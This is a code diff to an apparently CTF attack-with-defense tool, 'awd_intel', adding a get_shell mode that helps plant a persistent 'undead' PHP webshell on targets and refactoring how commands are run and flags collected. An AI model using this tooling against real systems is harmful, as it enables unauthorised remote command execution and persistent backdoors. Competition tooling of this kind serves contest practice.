@@ -66,6 +66,14 @@ class awd_intel():
 		# stop all the processes if set to 1
 		self.dead = 0
 
+		# test whether to get shell
+		if options.command == 'get_shell':
+			self.get_shell = 1
+			dump_info("begin to run for flag")
+		else:
+			self.get_shell = 0
+
+
 
 	def prepare_tgt(self,udf_target):
 		'''
@@ -121,7 +129,7 @@ class awd_intel():
 
 
 
-	def attack(self,target,target_port,cmd,get_flag):
+	def attack(self,target,target_port,cmd):
 
 		# status
 		global headers,targets_status
@@ -144,7 +152,7 @@ class awd_intel():
 			# Sometime the timeout is result from we are generating an undead webshell
 			if shell_name in cmd and shell_type==2 and check_shell(target,target_port,"")!='hell0W0r1d':
 				dump_warning("Writting undead php webshell")
-				res = "don't panic: timeout due to write undead webshell"
+				res = cmd_prefix + "don't panic: timeout due to write undead webshell" + cmd_postfix
 			else:
 				dump_error("connect timeout",target+":"+str(target_port),"function.py check_shell")
 				write_specific_log(target,target_port,"[-] connect timeout")
@@ -165,7 +173,7 @@ class awd_intel():
 		res = res_filter(res)
 
 		# flag handle
-		if get_flag:
+		if self.get_flag:
 			if check_flag(res):
 				flag = res
 				is_flag = 1
@@ -183,6 +191,10 @@ class awd_intel():
 			dump_success("execution cmd",target+":"+str(target_port),"run.py")
 			write_specific_log(target,target_port,"[+] execute cmd success")
 		dump_context(res)
+
+		# assist to generate the undead shell
+		if self.get_shell and shell_type==2:
+			execute_shell(target,target_port,"")
 		
 
 		# display the status for a target
@@ -250,7 +262,7 @@ class awd_intel():
 					cmd = self.prepare_cmd(self.cmd,target,target_port)
 					dump_info("start attack %s with %s "%(target + ':' + target_port, self.cmd))
 
-					self.attack(target,target_port,cmd,self.get_flag)
+					self.attack(target,target_port,cmd)
 				else:
 					# sleep to reduce the condition race
 					dump_warning('condition race detected')
@@ -300,6 +312,7 @@ def banner():
 	my_banner += "                                             \n"
 	my_banner += "                          Hence Zhang@Lancet \n"
 	my_banner += "                                             \n"
+	my_banner += "                                    v1.1     \n"
 	print my_banner
 
 
